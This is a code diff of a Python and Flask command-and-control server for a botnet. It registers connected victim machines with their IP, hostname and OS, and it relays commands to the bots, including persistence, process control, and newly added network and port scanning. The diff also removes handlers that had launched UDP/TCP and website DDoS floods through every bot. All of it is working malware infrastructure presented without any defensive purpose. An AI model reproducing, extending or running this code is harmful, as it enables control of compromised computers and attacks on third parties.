@@ -29,7 +29,7 @@ from tkinter import *
 from flask import *
 
 # Server info
-ippp      	= "192.168.0.2" 			# IP_HERE
+ippp      	= "192.168.0.2" 	# IP_HERE
 port_    	= "1888"			# PORT_HERE
 port   		= int(port_)
 
@@ -595,16 +595,14 @@ def collect():
 			conn, address = sock.accept()
 			all_connections.append(conn)
 			all_address.append(address)
-		except socket.timeout: continue
-		except socket.error: continue
-		except Exception as e: print_debug("Error accepting connections: " + str(e))
-		try:
-			all_connections[-1].send("sendinfo".encode())
-			out = f'{all_connections[-1].recv(1024*5).decode("ascii")}'
+
+			conn.send("sendinfo".encode())
+			out = f'{conn.recv(1024*5).decode("ascii")}'
 
 			out = out.split()
 			info = {}
-			info['COMMAND'] 	= 'INFO'
+			info['COMMAND'] = 'INFO'
+			
 			if hostname_list != []:					# if there are clients in the list
 				if out[1] not in hostname_list:
 					info["IP"] 			= out[0]
@@ -620,21 +618,23 @@ def collect():
 
 					database.append(client(info))
 				else: print_debug("Collect Thread: client already in database")
+			
 			else:
-				print_debug("Collect Thread: No clients in list adding new client")
-				print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
-				info["IP"] 			= out[0]
-				info["hostname"] 	= out[1]
-				info["OS"] 			= out[2]
-				info["status"]  	= str(out[3])
+					print_debug("Collect Thread: No clients in list adding new client")
+					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
+					info["IP"] 			= out[0]
+					info["hostname"] 	= out[1]
+					info["OS"] 			= out[2]
+					info["status"]  	= str(out[3])
 
-				hostname_list.append(out[1])
-				public_ips.append(out[0])
-				database.append(client(info))
-		except BrokenPipeError:
-			del all_address[-1]
-			del all_connections[-1]
-		sleep(0.5)
+					hostname_list.append(out[1])
+					public_ips.append(out[0])
+					database.append(client(info))
+		
+		except socket.timeout: continue
+		except socket.error: continue
+		except Exception as e: print_debug("Error accepting connections: " + str(e))
+		sleep(2)
 
 def check(display:bool=False, always:bool=True):
 	global all_ids
@@ -695,6 +695,8 @@ def _take_cmd(bot, cmd):
 	elif cmd == "stopprocessscontrol":
 		return call_script(bot, cmd)
 
+	elif cmd == "networkscan":
+		return call_script(bot, cmd)
 
 
 	elif "processcontrol" in cmd:
@@ -718,6 +720,9 @@ def _take_cmd(bot, cmd):
 	elif "persistance" in cmd:
 		return call_script(bot, cmd)
 
+	elif "portscan" in cmd:
+		return call_script(bot, cmd)
+
 	else: return(f"Error: {cmd} is not a valid command")
 
 def _take_shell_cmd(i, cmd):
@@ -727,7 +732,7 @@ def _take_shell_cmd(i, cmd):
 	except BrokenPipeError:
 		del all_address[i]
 		del all_connections[i]
-	return(f"Error")
+	except: return(f"Error")
 
 def command_check(command):
 	if command == "stress": 
@@ -761,6 +766,12 @@ def command_check(command):
 	elif command == "persistance":
 		persistance_name = request.form.get('persistance-name')
 		return (f'{command} {persistance_name}')
+
+	elif command == "portscan":
+		port_scan_starting_port = request.form.get('portscan-starting-port')
+		port_scan_ending_port 	= request.form.get('portscan-ending-port')
+		port_scan_threads 		= request.form.get('portscan-threads')
+		return (f'{command} {port_scan_starting_port} {port_scan_ending_port} {port_scan_threads}')
 
 	else: return command
 #endregion
@@ -830,72 +841,9 @@ def sendcommands():
 					out = "" # clear output
 					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
 
-				
-				elif command_ == "attack": 
-					xx = 0
-					ddos_method 	= str(request.form.get('ddos-ip-method')).lower()
-					ddos_target 	= request.form.get('ddos-ip-target')
-					ddos_port 		= request.form.get('ddos-ip-port')
-					ddos_time	 	= request.form.get('ddos-ip-time')
-					ddos_thread 	= request.form.get('ddos-ip-thread')
-					if ddos_method == "udp" or ddos_method == "tcp": 
-						try: 
-							for x in database:
-								with ThreadPoolExecutor(max_workers=500) as executor:
-									executor.submit(call_script(xx, str(command))) ; xx+=1
-
-							out += "\n\n" + f"""Attack sent successfully
-
-
-    -------Attack Infomation-------
-
-    IP:             \t{ddos_target}
-    Port:           \t{ddos_port}
-    Bots Amount:    \t{xx}
-    Attack Time:    \t{ddos_time}s
-    Attack Method:  \t{ddos_method}
-    Thread Amount:  \t{ddos_thread}
-"""
-
-							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-
-						except Exception as e: 
-							print_debug("Error while sending command: " + str(e))
-							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-					
-					else: out += f"Invalid Attack Method: {ddos_method}"
-
-				elif command_ == "ddos": 
-					xx = 0
-					ddos_method 	= str(request.form.get('ddos-website-method')).lower()
-					ddos_target 	= request.form.get('ddos-website-target')
-					ddos_time	 	= request.form.get('ddos-website-time')
-					ddos_thread 	= request.form.get('ddos-website-thread')
-					if ddos_method == "cfb" or ddos_method == "pxcfb" or ddos_method == "cfreq" or ddos_method == "cfsoc": 
-						try:
-							for x in database:
-								with ThreadPoolExecutor(max_workers=500) as executor:
-									executor.submit(call_script(xx, str(command))) ; xx+=1
-
-							out += "\n\n" + f"""Attack sent successfully
-
-
-    -------Attack Infomation-------
-
-    Target:         \t{ddos_target}
-    Bots Amount:    \t{xx}
-    Attack Time:    \t{ddos_time}s
-    Attack Method:  \t{ddos_method}
-    Thread Amount:  \t{ddos_thread}
-"""
-							
-							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-						
-						except Exception as e: 
-							print_debug("Error while sending command: " + str(e))
-							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-					
-					else: out += f"Invalid Attack Method: {ddos_method}" ; return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+				elif command_ == "listbots":
+					out += f"\n\nConnected bots: {str(len(database))}"
+					return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
 
 				else:
 					command += str(command_check(str(command_)))
